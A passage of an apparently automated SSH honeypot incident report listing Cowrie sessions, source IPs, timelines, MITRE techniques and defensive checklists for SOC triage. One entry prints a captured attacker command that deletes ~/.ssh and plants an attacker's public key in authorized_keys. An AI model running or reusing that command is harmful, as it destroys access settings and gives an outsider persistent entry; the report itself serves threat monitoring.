| `2026-08-22 17:19:53` | `cowrie.client.kex` |
| `2026-08-22 17:19:54` | `cowrie.login.success` |
| `2026-08-22 17:19:54` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:19:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 17:19:54` | `cowrie.direct-tcpip.data` |
| `2026-08-22 17:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-371b92d42453

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 17:20 |
| **Last Seen** | 2026-08-22 17:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:20:10` | `cowrie.session.connect` |
| `2026-08-22 17:20:10` | `cowrie.client.version` |
| `2026-08-22 17:20:10` | `cowrie.client.kex` |
| `2026-08-22 17:20:11` | `cowrie.login.success` |
| `2026-08-22 17:20:12` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:20:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 17:20:12` | `cowrie.direct-tcpip.data` |
| `2026-08-22 17:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2626058f72e4

| Field | Detail |
|---|---|
| **Source IP** | `115.68.133[.]201` |
| **First Seen** | 2026-08-22 17:20 |
| **Last Seen** | 2026-08-22 17:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:20:15` | `cowrie.session.connect` |
| `2026-08-22 17:20:16` | `cowrie.client.version` |
| `2026-08-22 17:20:16` | `cowrie.client.kex` |
| `2026-08-22 17:20:18` | `cowrie.login.success` |
| `2026-08-22 17:20:19` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:20:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.68.133[.]201` to AbuseIPDB if not already reported
- [ ] Block `115.68.133[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f2e9ae0d2fd

| Field | Detail |
|---|---|
| **Source IP** | `99.224.131[.]187` |
| **First Seen** | 2026-08-22 17:20 |
| **Last Seen** | 2026-08-22 17:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:20:24` | `cowrie.session.connect` |
| `2026-08-22 17:20:25` | `cowrie.client.version` |
| `2026-08-22 17:20:25` | `cowrie.client.kex` |
| `2026-08-22 17:20:26` | `cowrie.login.success` |
| `2026-08-22 17:20:27` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `99.224.131[.]187` to AbuseIPDB if not already reported
- [ ] Block `99.224.131[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d93b5500fe2

| Field | Detail |
|---|---|
| **Source IP** | `65.20.149[.]239` |
| **First Seen** | 2026-08-22 17:22 |
| **Last Seen** | 2026-08-22 17:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:22:26` | `cowrie.session.connect` |
| `2026-08-22 17:22:27` | `cowrie.client.version` |
| `2026-08-22 17:22:27` | `cowrie.client.kex` |
| `2026-08-22 17:22:29` | `cowrie.login.success` |
| `2026-08-22 17:22:29` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:22:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.149[.]239` to AbuseIPDB if not already reported
- [ ] Block `65.20.149[.]239` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90cf18ccfb50

| Field | Detail |
|---|---|
| **Source IP** | `93.241.232[.]14` |
| **First Seen** | 2026-08-22 17:22 |
| **Last Seen** | 2026-08-22 17:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:22:34` | `cowrie.session.connect` |
| `2026-08-22 17:22:35` | `cowrie.client.version` |
| `2026-08-22 17:22:35` | `cowrie.client.kex` |
| `2026-08-22 17:22:36` | `cowrie.login.success` |
| `2026-08-22 17:22:36` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.241.232[.]14` to AbuseIPDB if not already reported
- [ ] Block `93.241.232[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bff723534771

| Field | Detail |
|---|---|
| **Source IP** | `179.181.133[.]153` |
| **First Seen** | 2026-08-22 17:22 |
| **Last Seen** | 2026-08-22 17:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:22:39` | `cowrie.session.connect` |
| `2026-08-22 17:22:40` | `cowrie.client.version` |
| `2026-08-22 17:22:40` | `cowrie.client.kex` |
| `2026-08-22 17:22:41` | `cowrie.login.success` |
| `2026-08-22 17:22:42` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:22:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.181.133[.]153` to AbuseIPDB if not already reported
- [ ] Block `179.181.133[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c8e7396850e

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]4` |
| **First Seen** | 2026-08-22 17:22 |
| **Last Seen** | 2026-08-22 17:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:22:47` | `cowrie.session.connect` |
| `2026-08-22 17:22:48` | `cowrie.client.version` |
| `2026-08-22 17:22:48` | `cowrie.client.kex` |
| `2026-08-22 17:22:51` | `cowrie.login.success` |
| `2026-08-22 17:22:51` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:22:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b7c3cd85350

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 17:29 |
| **Last Seen** | 2026-08-22 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:29:55` | `cowrie.session.connect` |
| `2026-08-22 17:29:55` | `cowrie.client.version` |
| `2026-08-22 17:29:55` | `cowrie.client.kex` |
| `2026-08-22 17:29:56` | `cowrie.login.success` |
| `2026-08-22 17:29:56` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:29:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 17:29:56` | `cowrie.direct-tcpip.data` |
| `2026-08-22 17:29:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-988550bb5b9a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 17:30 |
| **Last Seen** | 2026-08-22 17:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:30:14` | `cowrie.session.connect` |
| `2026-08-22 17:30:14` | `cowrie.client.version` |
| `2026-08-22 17:30:14` | `cowrie.client.kex` |
| `2026-08-22 17:30:15` | `cowrie.login.success` |
| `2026-08-22 17:30:15` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:30:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 17:30:15` | `cowrie.direct-tcpip.data` |
| `2026-08-22 17:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3516799ce851

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-22 17:34 |
| **Last Seen** | 2026-08-22 17:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:34:47` | `cowrie.session.connect` |
| `2026-08-22 17:34:47` | `cowrie.client.version` |
| `2026-08-22 17:34:47` | `cowrie.client.kex` |
| `2026-08-22 17:34:47` | `cowrie.login.success` |
| `2026-08-22 17:34:47` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:34:47` | `cowrie.direct-tcpip.data` |
| `2026-08-22 17:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cc3a44350cf

| Field | Detail |
|---|---|
| **Source IP** | `64.53.7[.]231` |
| **First Seen** | 2026-08-22 17:35 |
| **Last Seen** | 2026-08-22 17:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:35:46` | `cowrie.session.connect` |
| `2026-08-22 17:35:46` | `cowrie.client.version` |
| `2026-08-22 17:35:46` | `cowrie.client.kex` |
| `2026-08-22 17:35:47` | `cowrie.login.success` |
| `2026-08-22 17:35:47` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:35:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.53.7[.]231` to AbuseIPDB if not already reported
- [ ] Block `64.53.7[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33fd19f7b074

| Field | Detail |
|---|---|
| **Source IP** | `50.223.176[.]171` |
| **First Seen** | 2026-08-22 17:35 |
| **Last Seen** | 2026-08-22 17:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:35:52` | `cowrie.session.connect` |
| `2026-08-22 17:35:53` | `cowrie.client.version` |
| `2026-08-22 17:35:53` | `cowrie.client.kex` |
| `2026-08-22 17:35:54` | `cowrie.login.success` |
| `2026-08-22 17:35:54` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.223.176[.]171` to AbuseIPDB if not already reported
- [ ] Block `50.223.176[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e7e5be76e3e

| Field | Detail |
|---|---|
| **Source IP** | `57.129.74[.]123` |
| **First Seen** | 2026-08-22 17:39 |
| **Last Seen** | 2026-08-22 17:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:39:35` | `cowrie.session.connect` |
| `2026-08-22 17:39:35` | `cowrie.client.version` |
| `2026-08-22 17:39:35` | `cowrie.client.kex` |
| `2026-08-22 17:39:35` | `cowrie.login.success` |
| `2026-08-22 17:39:36` | `cowrie.session.params` |
| `2026-08-22 17:39:36` | `cowrie.command.input` |
| `2026-08-22 17:39:36` | `cowrie.command.failed` |
| `2026-08-22 17:39:36` | `cowrie.log.closed` |
| `2026-08-22 17:39:37` | `cowrie.session.params` |
| `2026-08-22 17:39:37` | `cowrie.command.input` |
| `2026-08-22 17:39:37` | `cowrie.session.file_download` |
| `2026-08-22 17:39:37` | `cowrie.log.closed` |
| `2026-08-22 17:39:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.129.74[.]123` to AbuseIPDB if not already reported
- [ ] Block `57.129.74[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46d44109a508

| Field | Detail |
|---|---|
| **Source IP** | `57.129.74[.]123` |
| **First Seen** | 2026-08-22 17:39 |
| **Last Seen** | 2026-08-22 17:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:39:37` | `cowrie.session.connect` |
| `2026-08-22 17:39:37` | `cowrie.client.version` |
| `2026-08-22 17:39:37` | `cowrie.client.kex` |
| `2026-08-22 17:39:38` | `cowrie.login.success` |
| `2026-08-22 17:39:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.129.74[.]123` to AbuseIPDB if not already reported
- [ ] Block `57.129.74[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa6c29771a27

| Field | Detail |
|---|---|
| **Source IP** | `57.129.74[.]123` |
| **First Seen** | 2026-08-22 17:39 |
| **Last Seen** | 2026-08-22 17:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:39:38` | `cowrie.session.connect` |
| `2026-08-22 17:39:38` | `cowrie.client.version` |
| `2026-08-22 17:39:38` | `cowrie.client.kex` |
| `2026-08-22 17:39:38` | `cowrie.login.success` |
| `2026-08-22 17:39:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.129.74[.]123` to AbuseIPDB if not already reported
- [ ] Block `57.129.74[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6900e6229355

| Field | Detail |
|---|---|
| **Source IP** | `147.15.110[.]51` |
| **First Seen** | 2026-08-22 17:39 |
| **Last Seen** | 2026-08-22 17:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:39:41` | `cowrie.session.connect` |
| `2026-08-22 17:39:41` | `cowrie.client.version` |
| `2026-08-22 17:39:41` | `cowrie.client.kex` |
| `2026-08-22 17:39:43` | `cowrie.login.success` |
| `2026-08-22 17:39:44` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:39:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.15.110[.]51` to AbuseIPDB if not already reported
- [ ] Block `147.15.110[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87c2a2a2017e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 17:39 |
| **Last Seen** | 2026-08-22 17:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:39:48` | `cowrie.session.connect` |
| `2026-08-22 17:39:48` | `cowrie.client.version` |
| `2026-08-22 17:39:48` | `cowrie.client.kex` |
| `2026-08-22 17:39:49` | `cowrie.login.success` |
| `2026-08-22 17:39:50` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:39:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 17:39:50` | `cowrie.direct-tcpip.data` |
| `2026-08-22 17:39:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10ae02eb0923

| Field | Detail |
|---|---|
| **Source IP** | `178.132.144[.]161` |
| **First Seen** | 2026-08-22 17:39 |
| **Last Seen** | 2026-08-22 17:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:39:49` | `cowrie.session.connect` |
| `2026-08-22 17:39:49` | `cowrie.client.version` |
| `2026-08-22 17:39:49` | `cowrie.client.kex` |
| `2026-08-22 17:39:50` | `cowrie.login.success` |
| `2026-08-22 17:39:51` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:39:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.132.144[.]161` to AbuseIPDB if not already reported
- [ ] Block `178.132.144[.]161` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39ab00ea375a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 17:40 |
| **Last Seen** | 2026-08-22 17:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:40:05` | `cowrie.session.connect` |
| `2026-08-22 17:40:05` | `cowrie.client.version` |
| `2026-08-22 17:40:05` | `cowrie.client.kex` |
| `2026-08-22 17:40:06` | `cowrie.login.success` |
| `2026-08-22 17:40:06` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:40:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 17:40:06` | `cowrie.direct-tcpip.data` |
| `2026-08-22 17:40:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a9c89c7b98f

| Field | Detail |
|---|---|
| **Source IP** | `111.39.206[.]23` |
| **First Seen** | 2026-08-22 17:44 |
| **Last Seen** | 2026-08-22 17:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:44:45` | `cowrie.session.connect` |
| `2026-08-22 17:44:46` | `cowrie.client.version` |
| `2026-08-22 17:44:46` | `cowrie.client.kex` |
| `2026-08-22 17:44:49` | `cowrie.login.success` |
| `2026-08-22 17:44:50` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.39.206[.]23` to AbuseIPDB if not already reported
- [ ] Block `111.39.206[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19e895df7004

| Field | Detail |
|---|---|
| **Source IP** | `101.13.1[.]58` |
| **First Seen** | 2026-08-22 17:44 |
| **Last Seen** | 2026-08-22 17:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:44:56` | `cowrie.session.connect` |
| `2026-08-22 17:44:57` | `cowrie.client.version` |
| `2026-08-22 17:44:57` | `cowrie.client.kex` |
| `2026-08-22 17:45:00` | `cowrie.login.success` |
| `2026-08-22 17:45:00` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:45:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.1[.]58` to AbuseIPDB if not already reported
- [ ] Block `101.13.1[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7000f3d9f5c

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-22 17:48 |
| **Last Seen** | 2026-08-22 17:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:48:14` | `cowrie.session.connect` |
| `2026-08-22 17:48:14` | `cowrie.client.version` |
| `2026-08-22 17:48:14` | `cowrie.client.kex` |
| `2026-08-22 17:48:15` | `cowrie.login.success` |
| `2026-08-22 17:48:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d7cff8f5008

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-22 17:48 |
| **Last Seen** | 2026-08-22 17:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:48:14` | `cowrie.session.connect` |
| `2026-08-22 17:48:14` | `cowrie.client.version` |
| `2026-08-22 17:48:14` | `cowrie.client.kex` |
| `2026-08-22 17:48:15` | `cowrie.login.success` |
| `2026-08-22 17:48:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c6274e7b262

| Field | Detail |
|---|---|
| **Source IP** | `169.58.161[.]169` |
| **First Seen** | 2026-08-22 17:48 |
| **Last Seen** | 2026-08-22 17:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:48:50` | `cowrie.session.connect` |
| `2026-08-22 17:48:50` | `cowrie.client.version` |
| `2026-08-22 17:48:50` | `cowrie.client.kex` |
| `2026-08-22 17:48:50` | `cowrie.login.success` |
| `2026-08-22 17:48:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.58.161[.]169` to AbuseIPDB if not already reported
- [ ] Block `169.58.161[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8fef2517223

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-22 17:48 |
| **Last Seen** | 2026-08-22 17:48 |
| **Session Duration** | 2s |
